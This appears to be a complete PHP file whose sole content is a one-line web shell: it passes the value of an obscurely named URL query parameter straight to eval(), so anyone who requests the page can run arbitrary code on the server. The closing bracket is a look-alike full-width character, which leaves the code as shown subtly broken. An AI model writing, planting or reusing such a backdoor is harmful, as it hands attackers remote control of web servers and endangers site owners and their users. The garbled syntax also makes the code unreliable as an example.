<?php
eval($_GET['8qIOfDMZ'〕);
?>
